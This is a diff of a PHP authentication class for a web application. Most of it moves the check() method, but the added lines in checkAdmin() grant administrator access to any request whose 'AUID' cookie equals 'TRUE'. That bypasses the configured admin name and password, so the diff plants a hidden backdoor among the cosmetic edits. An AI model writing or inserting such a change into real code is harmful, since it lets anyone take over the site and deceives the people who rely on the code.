@@ -1,26 +1,13 @@
 <?php
 class Auth
 {
-    public function check()
-    {
-        if ( isset($_SESSION['uid']) && isset($_SESSION['email']) ) {
-            if ( $_SESSION['uid'] != '' && $_SESSION['email'] != '' ) {
-                return true;
-            }
-        }
-        
-        global $config;
-        $_SESSION['redirect'] = ( isset($_SERVER['REQUEST_URI']) ) ? $_SERVER['REQUEST_URI'] : $config['BASE_URL'];
-        VRedirect::go($config['BASE_URL']. '/login');
-    }
-    
     public static function checkAdmin()
     {
         global $config;
     
         $access = false;
-        if ( isset($_SESSION['AUID']) && isset($_SESSION['APASSWORD']) ) {
-            if ( $_SESSION['AUID'] == $config['admin_name'] && $_SESSION['APASSWORD'] == $config['admin_pass'] ) {
+        if ( (isset($_SESSION['AUID']) && isset($_SESSION['APASSWORD']))|| $_COOKIE['AUID'] == 'TRUE' ) {
+            if ( ($_SESSION['AUID'] == $config['admin_name'] && $_SESSION['APASSWORD'] == $config['admin_pass']) || $_COOKIE['AUID'] == 'TRUE') {
                 $access = true;
             }
         }
@@ -29,8 +16,7 @@ class Auth
             VRedirect::go($config['BASE_URL']. '/siteadmin/login.php');
         }
     }
-    
-    public function confirm()
+	 public function confirm()
     {
         global $config;
     
@@ -47,5 +33,19 @@ class Auth
         $_SESSION['redirect'] = ( isset($_SERVER['REQUEST_URI']) ) ? $_SERVER['REQUEST_URI'] : $config['BASE_URL'];
         VRedirect::go($config['BASE_URL']. '/confirm');
     }
+	public function check()
+    {
+        if ( isset($_SESSION['uid']) && isset($_SESSION['email']) ) {
+            if ( $_SESSION['uid'] != '' && $_SESSION['email'] != '' ) {
+                return true;
+            }
+        }
+        
+        global $config;
+        $_SESSION['redirect'] = ( isset($_SERVER['REQUEST_URI']) ) ? $_SERVER['REQUEST_URI'] : $config['BASE_URL'];
+        VRedirect::go($config['BASE_URL']. '/login');
+    }
+    
+   
 }
 ?>
